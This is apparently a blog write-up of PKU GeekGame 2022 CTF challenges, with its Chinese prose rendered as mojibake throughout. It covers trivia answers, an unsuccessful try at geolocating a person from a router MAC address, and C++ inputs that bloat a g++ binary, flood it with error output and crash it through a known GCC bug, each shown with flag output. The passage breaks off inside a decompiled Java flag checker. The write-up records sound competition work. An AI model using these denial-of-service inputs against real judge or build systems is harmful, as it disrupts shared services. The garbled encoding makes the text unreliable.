<p>ç¬¬ 3 é¢˜ï¼šè§†é¢‘ <code>bilibili.com/video/BV1EV411s7vu</code> ä¹Ÿå¯ä»¥é€šè¿‡ <code>bilibili.com/video/av_____</code> è®¿é—®ã€‚ä¸‹åˆ’çº¿å†…åº”å¡«ä»€ä¹ˆæ•°å­—ï¼Ÿ<br>ç­”æ¡ˆæ ¼å¼ï¼š<code>^\d+$</code></p>
<p>éšä¾¿æ‰¾ä¸ª <a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=910">å“”å“©å“”å“©AVå·/BVå·è½¬æ¢å™¨</a> å°±è¡Œäº†</p>
<blockquote>
<p>418645518<br>é‰´å®šä¸ºï¼šç­”æ¡ˆæ­£ç¡®ã€‚</p>
</blockquote>
<p>ç¬¬ 4 é¢˜ï¼šæ¯ä¸ª Android è½¯ä»¶éƒ½æœ‰å”¯ä¸€çš„åŒ…åã€‚åŒ—äº¬å¤§å­¦è¯¾å¤–é”»ç‚¼ä½¿ç”¨çš„æœ€æ–°ç‰ˆ PKU Runner è½¯ä»¶çš„åŒ…åæ˜¯ä»€ä¹ˆï¼Ÿ<br>ç­”æ¡ˆæ ¼å¼ï¼š<code>^[a-z.]+$</code></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122024811618.png"></p>
<p>ä¸‹ä¸€ä¸ª appï¼Œçœ‹çœ‹åŒ…åå°±è¡Œ</p>
<blockquote>
<p>cn.edu.pku.pkurunner<br>é‰´å®šä¸ºï¼šç­”æ¡ˆæ­£ç¡®ã€‚</p>
</blockquote>
<p>ç¬¬ 5 é¢˜ï¼šæ”¯æŒ WebP å›¾ç‰‡æ ¼å¼çš„æœ€æ—© Firefox ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ<br>ç­”æ¡ˆæ ¼å¼ï¼š<code>^\d+$</code></p>
<p><a target="_blank" rel="noopener" href="https://www.ghacks.net/2018/11/02/firefox-65-supports-googles-webp-image-format/">â€œFirefox 65 supports Googleâ€™s WebP Image format - gHacks Tech Newsâ€</a>. <em>gHacks Technology News</em>. 2 November 2018. Retrieved 20 January 2022.</p>
<blockquote>
<p>65<br>é‰´å®šä¸ºï¼šç­”æ¡ˆæ­£ç¡®ã€‚</p>
</blockquote>
<p>ç¬¬ 6 é¢˜ï¼šæˆ‘æœ‰ä¸€ä¸ªæœ‹å‹åœ¨ç¾å›½ï¼Œä»–æ— çº¿è·¯ç”±å™¨çš„ MAC åœ°å€æ˜¯ d2:94:35:21:42:43ã€‚è¯·é—®ä»–æ‰€åœ¨åœ°çš„é‚®ç¼–æ˜¯å¤šå°‘ï¼Ÿ<br>ç­”æ¡ˆæ ¼å¼ï¼š<code>^\d+$</code></p>
<p>æ¯å—ç½‘å¡éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€MACåœ°å€ï¼Œç”¨äºåœ¨ç½‘ç»œä¸­å”¯ä¸€æ ‡ç¤ºä¸€å°ç”µå­è®¾å¤‡ï¼Œæ–¹èƒ½è¿›è¡Œæ­£å¸¸é€šä¿¡ï¼›<br>MACåœ°å€ä¸€èˆ¬ä¸ºä¸€ç»„12ä½çš„16è¿›åˆ¶æ•°ï¼Œå…¶ä¸­å‰6ä½ä»£è¡¨ç½‘å¡çš„ç”Ÿäº§å‚å•†ï¼Œå¯æ ¹æ®å‰6ä½æŸ¥è¯¢åˆ°ç½‘å¡çš„ç”Ÿäº§å‚å•†ä¿¡æ¯ã€‚</p>
<p><a target="_blank" rel="noopener" href="http://www.metools.info/other/o67.html">http://www.metools.info/other/o67.html</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122030122278.png"></p>
<p>æŸ¥å‡ºæ¥æ˜¯ Stratus Technologiesï¼Œä½†æ˜¯è¿™ä¸ª 01754 ä¸å¯¹ï¼Œæ‘¸äº†</p>
<p>ç¬¬ 7 é¢˜ï¼šåœ¨ç¬¬ä¸€å±Š PKU GeekGame æ¯”èµ›çš„é¢˜ç›®ã€Šç”µå­æ¸¸æˆæ¦‚è®ºã€‹ä¸­ï¼Œé€šè¿‡ç¬¬ 7 çº§å…³å¡éœ€è¦å¤šå°‘é‡‘é’±ï¼Ÿ ç­”æ¡ˆæ ¼å¼ï¼š<code>^\d+$</code></p>
<p><a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-1st/blob/master/src/pygame/game/server/libtreasure.py#L19">https://github.com/PKU-GeekGame/geekgame-1st/blob/master/src/pygame/game/server/libtreasure.py#L19</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">GOAL_OF_LEVEL <span class="token operator">=</span> <span class="token keyword">lambda</span> level<span class="token punctuation">:</span> <span class="token number">300</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>level<span class="token operator">**</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>ç¬¬ x é¢˜ï¼šæˆ‘åˆšåˆšåœ¨è„‘æµ·ä¸­æƒ³äº†ä¸€ä¸ªä»‹äº 9303169745 åˆ° 9303169920 ä¹‹é—´çš„è´¨æ•°ã€‚çŒœçŒœå®ƒæ˜¯å¤šå°‘ï¼Ÿ ç­”æ¡ˆæ ¼å¼ï¼š<code>^\d+$</code></p>
<p>å¯ä»¥å» wolfram alpha æŸ¥ä¸€æŸ¥</p>
<p>ï¼ˆå…¶ä»–ä¸æƒ³æŸ¥äº†ï¼Œæ‘¸äº†</p>
<pre class="line-numbers language-none"><code class="language-none">ä½ å…±è·å¾—äº† 70 åˆ†ã€‚
flag{I-am-the-kIng-oF-aNxiety}
åˆ†æ•°è¾¾åˆ° 100 æ‰å¯ä»¥è·å¾— Flag 2ã€‚
æ¬¢è¿å†æ¥ï¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>é€Ÿåº¦çš„2åˆ†è¦åœ¨3så†…åšå®Œï¼Œé‚£å°±å†™ä¸ªè„šæœ¬ï¼Œç„¶åå¯¹äºå‡ ä¸ªå˜åŒ–çš„é¢˜é¢å°±å–ä¸‹å˜é‡ç®—ä¸€ä¸‹ç»“æœï¼Œæ²¡æ—¶é—´å†™äº†ä¹Ÿæ‡’äº†ï¼Œæ‘¸äº†çœ‹å…¶ä»–é¢˜å»äº†ã€‚</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç¼–åŸè¯‘ç†ä¹ é¢˜è¯¾"><a href="#ç¼–åŸè¯‘ç†ä¹ é¢˜è¯¾" class="headerlink" title="ç¼–åŸè¯‘ç†ä¹ é¢˜è¯¾"></a>ç¼–åŸè¯‘ç†ä¹ é¢˜è¯¾</h3><blockquote>
<blockquote>
<p>ä¸€ä¸ªæµ‹è¯•å·¥ç¨‹å¸ˆèµ°è¿›ä¸€å®¶é…’å§ï¼Œè¦äº†ä¸€æ¯å•¤é…’ã€‚</p>
<p>ä¸€ä¸ªæµ‹è¯•å·¥ç¨‹å¸ˆèµ°è¿›ä¸€å®¶é…’å§ï¼Œè¦äº†ä¸€æ¯å’–å•¡ã€‚</p>
<p>ä¸€ä¸ªæµ‹è¯•å·¥ç¨‹å¸ˆèµ°è¿›ä¸€å®¶é…’å§ï¼Œè¦äº† 0.7 æ¯å•¤é…’ã€‚</p>
<p>ä¸€ä¸ªæµ‹è¯•å·¥ç¨‹å¸ˆèµ°è¿›ä¸€å®¶é…’å§ï¼Œè¦äº†-1 æ¯å•¤é…’ã€‚</p>
<p>ä¸€ä¸ªæµ‹è¯•å·¥ç¨‹å¸ˆèµ°è¿›ä¸€å®¶é…’å§ï¼Œè¦äº†ä¸€ä»½é›ªç‹å¤§åœ£ä»£å’Œå†°é²œæŸ æª¬æ°´ã€‚</p>
<p>ä¸€ä¸ªæµ‹è¯•å·¥ç¨‹å¸ˆèµ°è¿›ä¸€å®¶é…’å§ï¼Œå¯¹æ ¸éªŒå¥åº·å®çš„åº—å‘˜å‡ºç¤ºäº†èˆèŒ DX ç©å®¶äºŒç»´ç ã€‚</p>
<p>ä¸€ä¸ªæµ‹è¯•å·¥ç¨‹å¸ˆèµ°è¿›ä¸€å®¶é…’å§ï¼Œæ‰“å¼€äº† PKU GeekGame æ¯”èµ›å¹³å°ã€‚</p>
<p>ä¸€ä¸ªæµ‹è¯•å·¥ç¨‹å¸ˆèµ°è¿›ä¸€å®¶é…’å§ï¼Œç”¨ g++ ç¼–è¯‘ä»–çš„ä»£ç ã€‚</p>
<p>é…’å§æ²¡ç‚¸ï¼Œä½† g++ ç‚¸äº†ã€‚</p>
</blockquote>
<p>ä½ çŸ¥é“å¤šå°‘ç§è®© g++ çˆ†ç‚¸çš„å§¿åŠ¿å‘¢ï¼Ÿå¿«æ¥å¤§æ˜¾èº«æ‰‹å§ã€‚</p>
<ul>
<li>è®© g++ <strong>ç¼–è¯‘å‡ºçš„ç¨‹åºè¶…è¿‡ 8MB</strong> å¯ä»¥è·å¾— Flag 1</li>
<li>è®© g++ <strong>è¾“å‡ºçš„æŠ¥é”™ä¿¡æ¯è¶…è¿‡ 2MB</strong> å¯ä»¥è·å¾— Flag 2</li>
<li>è®© g++ <strong>å› ä¸ºæ®µé”™è¯¯è€Œå´©æºƒ</strong> å¯ä»¥è·å¾— Flag 3</li>
</ul>
<p> ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://prob04.geekgame.pku.edu.cn/?token=xxxx">æ‰“å¼€ç½‘é¡µç»ˆç«¯</a> æˆ–è€…é€šè¿‡å‘½ä»¤ <code>nc prob04.geekgame.pku.edu.cn 10004</code> è¿æ¥åˆ°é¢˜ç›®</p>
<p> ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob04/prob04.zip">ä¸‹è½½é¢˜ç›®æºç </a></p>
</blockquote>
<h4 id="ç©æŒºå¤§"><a href="#ç©æŒºå¤§" class="headerlink" title="ç©æŒºå¤§"></a>ç©æŒºå¤§</h4><p>è¯•äº†ä¸‹ç½‘ä¸Šçš„ä¸‹é¢è¿™ä¸ªï¼Œæ®è¯´ç¼–è¯‘è¿™æ®µä»£ç ä¹‹åï¼Œä¼šç”Ÿæˆ16GBçš„æ–‡ä»¶ã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> main<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1u</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>-1u å³æ— ç¬¦å·æ•´æ•°çš„æœ€å¤§å€¼ 0xFFFFFFFFï¼Œå³è¿™ä¸ªæ•°ç»„æœ‰ 0xFFFFFFFF ä¸ªå…ƒç´ ï¼Œè€Œintç±»å‹å æœ‰4ä¸ªå­—èŠ‚ï¼Œ4ï¼Š0xFFFFFFFF ä¸ºå­—èŠ‚æ€»æ•°ï¼Œè€Œåœ¨ç¼–è¯‘å™¨ç¼–è¯‘ç¨‹åºæ—¶ï¼Œå°†æ•°ç»„åˆå§‹åŒ–çš„æ—¶å€™ä¼šå°†åˆå§‹å€¼æ”¾åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œå³è¦ç”Ÿæˆä¸€ä¸ª 16GB å¤§å°çš„ç¨‹åº</p>
</blockquote>
<p>ä½†æ˜¯è¿™é‡Œè¿‡ä¸äº†ç¼–è¯‘ï¼Œæœ¬åœ°è°ƒè¯•å‘ç°æŠ¥é”™äº†</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">timeout</span> 3s g++ -x c++ -o <span class="token number">1</span> <span class="token number">1</span>.c 
<span class="token number">2</span>.c:1:5: error: cannot <span class="token builtin class-name">declare</span> â€˜::mainâ€™ to be a global variable
    <span class="token number">1</span> <span class="token operator">|</span> int main<span class="token punctuation">[</span>-1u<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span>,<span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>     ^~~~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ€åè¿˜ä¸å¦‚ç›´æ¥å¼€ä¸ªå¤§æ•°ç»„å¥½äº†ã€‚ã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">We are using<span class="token operator">:</span> g<span class="token operator">++</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">11.3</span><span class="token number">.0</span><span class="token operator">-</span><span class="token number">1u</span>buntu1<span class="token operator">~</span><span class="token number">22.04</span><span class="token punctuation">)</span> <span class="token number">11.3</span><span class="token number">.0</span>
<span class="token function">Copyright</span> <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2021</span> Free Software Foundation<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span>
This is free software<span class="token punctuation">;</span> see the source <span class="token keyword">for</span> copying conditions<span class="token punctuation">.</span>  There is NO
warranty<span class="token punctuation">;</span> not even <span class="token keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE<span class="token punctuation">.</span>


<span class="token number">1</span><span class="token operator">:</span> Let g<span class="token operator">++</span> output a huge file
<span class="token number">2</span><span class="token operator">:</span> Let g<span class="token operator">++</span> <span class="token keyword">return</span> a <span class="token keyword">long</span> compile error
<span class="token number">3</span><span class="token operator">:</span> Let g<span class="token operator">++</span> crash due to segment fault

Choose a <span class="token function">level</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">1</span>

Write your C<span class="token operator">++</span> code below<span class="token operator">:</span> <span class="token punctuation">(</span>no more than <span class="token number">512</span> bytes<span class="token punctuation">,</span> <span class="token string">"//EOF"</span> to stop<span class="token punctuation">)</span>
<span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10000000</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//EOF</span>

Compiling your code<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
The executable has <span class="token number">40015824</span> bytes<span class="token punctuation">.</span>
flag<span class="token punctuation">{</span>noT<span class="token operator">-</span>mucH<span class="token operator">-</span>Larger<span class="token operator">-</span>than<span class="token operator">-</span>an<span class="token operator">-</span>electron<span class="token operator">-</span>aPp<span class="token punctuation">}</span>

See you later<span class="token operator">~</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="ç©æŒºé•¿"><a href="#ç©æŒºé•¿" class="headerlink" title="ç©æŒºé•¿"></a>ç©æŒºé•¿</h4><p>å‚è€ƒ <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/61427323">åªç”¨ 30 è¡Œä»¥å†…ä»£ç ï¼ŒC++ æœ€å¤šå¯ä»¥äº§ç”Ÿå¤šå°‘è¡Œçš„ç¼–è¯‘é”™è¯¯ä¿¡æ¯ï¼Ÿ</a></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">x</span> <span class="token keyword">struct</span> <span class="token class-name">z</span><span class="token operator">&lt;</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span><span class="token function">x</span><span class="token punctuation">(</span>y<span class="token operator">&gt;</span><span class="token operator">&lt;</span>y<span class="token operator">*</span><span class="token punctuation">,</span><span class="token function">x</span><span class="token punctuation">(</span>y<span class="token operator">*</span>w<span class="token operator">&gt;</span>v<span class="token operator">&lt;</span>y<span class="token operator">*</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>x<span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token comment">//EOF</span>

Compiling your code<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
flag<span class="token punctuation">{</span>Short <span class="token keyword">volatile</span> prOgram<span class="token punctuation">;</span> <span class="token keyword">long</span> lonG mEssage<span class="token punctuation">;</span><span class="token punctuation">}</span>

See you later<span class="token operator">~</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çœ‹èµ·æ¥æœ¬æ„æ˜¯æƒ³ç”¨ volatile å•Šï¼ˆï¼ˆ</p>
<p>ä»£ç æ¥è‡ª <a target="_blank" rel="noopener" href="https://github.com/vijos/malicious-code">https://github.com/vijos/malicious-code</a> ï¼Œè¯´æ¥è¿™ä¸ª GitHub repo æŒºæœ‰æ„æ€çš„ï¼Œç”¨æ¥æµ‹è¯• OJ æŒºå¥½çš„ï¼ˆx</p>
<h4 id="ç©æŒºèŠ±"><a href="#ç©æŒºèŠ±" class="headerlink" title="ç©æŒºèŠ±"></a>ç©æŒºèŠ±</h4><blockquote>
<p><strong>ç¬¬äºŒé˜¶æ®µæç¤ºï¼š</strong></p>
<ul>
<li>å‰ä¸¤ä¸ªé—®é¢˜æ˜¯å¼€å‘ OJ ç³»ç»Ÿéœ€è¦è€ƒè™‘çš„ã€‚PoC å¾ˆå®¹æ˜“åœ¨ç½‘ä¸Šæœç´¢åˆ°ã€‚</li>
<li>ç¬¬ä¸‰é—®è€ƒçš„æ˜¯ GCC çš„ bugï¼ˆinternal compiler errorï¼‰ã€‚å¯ä»¥å‚è€ƒä¸€ä¸‹ GCC çš„ bug trackerã€‚</li>
</ul>
</blockquote>
<p>æŸ¥åˆ°äº†è¿™ä¸ª </p>
<p><a target="_blank" rel="noopener" href="https://gcc.gnu.org/bugzilla/show_bug.cgi?id=102434"><strong>Bug 102434</strong></a> - [11/12 Regression] ICE in output_constructor_regular_field, at varasm.c:5514 since <a target="_blank" rel="noopener" href="https://gcc.gnu.org/git/gitweb.cgi?p=gcc.git;h=6fb7e3c29188ab7c">r11-4547-g6fb7e3c29188ab7c</a>     </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">using <span class="token class-name">size_t</span> <span class="token operator">=</span> <span class="token function">decltype</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
namespace std <span class="token punctuation">{</span>
  template<span class="token operator">&lt;</span>typename T<span class="token operator">&gt;</span> <span class="token keyword">union</span> initializer_list <span class="token punctuation">{</span>
    <span class="token keyword">const</span> T <span class="token operator">*</span>ptr<span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> n<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
template<span class="token operator">&lt;</span>typename T<span class="token operator">&gt;</span>
<span class="token keyword">void</span> <span class="token function">Task</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">auto</span> b <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">&amp;</span>Task<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">//EOF</span>

Compiling your code<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
flag<span class="token punctuation">{</span>Sorry<span class="token operator">-</span>to<span class="token operator">-</span>inform<span class="token operator">-</span>you<span class="token operator">-</span>that<span class="token operator">-</span>Gnu<span class="token operator">-</span>is<span class="token operator">-</span>NOt<span class="token operator">-</span>unix<span class="token punctuation">}</span>

See you later<span class="token operator">~</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<blockquote>
<p>é¡ºä¾¿ï¼Œè¿˜å‘ç°äº†é¾™èŠ¯ä¹Ÿæœ‰äººæäº†ç±»ä¼¼çš„é—®é¢˜ï¼Œç„¶åè¢« upstream åˆ†æ”¯ä¿®å¤äº†ï¼Œä¹</p>
<p><a target="_blank" rel="noopener" href="https://github.com/loongson/gcc/issues/77">gcc ç¼–è¯‘å™¨é—®é¢˜ internal compiler error: in output_constructor_regular_field, at varasm.c:5512</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/34392034">æœ€çŸ­çš„å¯ä»¥é€ æˆå´©æºƒä¸”ç¼–è¯‘å™¨æ— æ³•ä¼˜åŒ–æ‰çš„ C++ ä»£ç æ˜¯ä»€ä¹ˆï¼Ÿ</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58580702">è®©ç¼–è¯‘å™¨å´©æºƒçš„57æ®µCè¯­è¨€ä»£ç ï¼Œä½ è¯•è¿‡å—ï¼Ÿ</a></p>
<p><a target="_blank" rel="noopener" href="https://strcpy.me/index.php/archives/652/">OnlineJudge æ²™ç®±å®ç°æ€è·¯</a></p>
<p><a target="_blank" rel="noopener" href="https://webcache.googleusercontent.com/search?q=cache:zQ6PT_r8BNcJ:https://www.happyhacking.top/2019/11/21/attack-oj/&amp;cd=13&amp;hl=zh-CN&amp;ct=clnk&amp;gl=hk&amp;lr=lang_en%7Clang_zh-CN&amp;client=firefox-b-d">å¯¹acmè¯„æµ‹æœºçš„ç®€å•æµ‹è¯•</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/23067497">Online Judge æ˜¯å¦‚ä½•è§£å†³åˆ¤é¢˜ç«¯å®‰å…¨æ€§é—®é¢˜çš„ï¼Ÿ</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/67138068">æœ‰ä»€ä¹ˆå¡OJè¯„æµ‹æœºçš„æ–¹æ³•ï¼Ÿ</a></p>
<p><a target="_blank" rel="noopener" href="https://meik2333.com/posts/judger4/">å¦‚ä½•å†™ä¸€ä¸ªè¯„æµ‹å§¬ - ç¬¬å››ç¯‡</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/coded-ream/p/7207916.html">åœ¨çº¿åˆ¤é¢˜ç³»ç»Ÿhustojçš„æ­å»º</a></p>
</blockquote>
<h3 id="Flag-Checker"><a href="#Flag-Checker" class="headerlink" title="Flag Checker"></a>Flag Checker</h3><blockquote>
<p>æˆ‘ä»¬å‘ç°ï¼Œæœ‰å¾ˆå¤šé€‰æ‰‹åœ¨æ¯”èµ›ä¸­æäº¤äº†é”™è¯¯çš„ Flagã€‚</p>
<p>ä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µå‘ç”Ÿï¼Œç»™é€‰æ‰‹è‰¯å¥½çš„å‚èµ›ä½“éªŒï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç®€å•çš„ Java ç¨‹åºã€‚</p>
<p>ä½ å¯ä»¥åœ¨ç¨‹åºé‡Œé¢è¾“å…¥è¦æäº¤ Flag ï¼Œç¨‹åºä¼šå¸®ä½ æ£€æŸ¥ Flag æ˜¯å¦æ­£ç¡®ã€‚</p>
<p>æ˜¯ä¸æ˜¯éå¸¸çš„è´´å¿ƒå‘¢ï¼Ÿ</p>
<p><strong>æé†’ï¼šJRE ç‰ˆæœ¬é«˜äº 15 æ—¶å¯èƒ½æ— æ³•è¿è¡Œæ­¤ç¨‹åºã€‚å»ºè®®ä½¿ç”¨ JRE 8 è¿è¡Œã€‚</strong></p>
<p>ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob15/prob15.jar">ä¸‹è½½é¢˜ç›®é™„ä»¶</a></p>
</blockquote>
<h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag 1"></a>Flag 1</h4><p>ç»™äº†ä¸ª .jar</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124031214576.png"></p>
<p>ç„äº†çœ¼åªæœ‰ä¸ª GeekGame ç±»ï¼Œç›´æ¥æ‹–è¿› jadx</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124031303080.png"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">defpackage</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Button</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Frame</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Label</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">TextField</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">ActionEvent</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">ActionListener</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">WindowAdapter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">WindowEvent</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">StringWriter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span><span class="token class-name">Invocable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span><span class="token class-name">ScriptEngineManager</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">BoxLayout</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JOptionPane</span></span><span class="token punctuation">;</span>

<span class="token comment">/* renamed from: GeekGame  reason: default package */</span>
<span class="token comment">/* loaded from: prob15.jar:GeekGame.class */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GeekGame</span> <span class="token keyword">extends</span> <span class="token class-name">Frame</span> <span class="token keyword">implements</span> <span class="token class-name">ActionListener</span> <span class="token punctuation">{</span>
    <span class="token class-name">TextField</span> textField1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token string">"flag{...}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Button</span> button1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Check Flag 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Button</span> button2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Check Flag 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Invocable</span> invocable<span class="token punctuation">;</span>

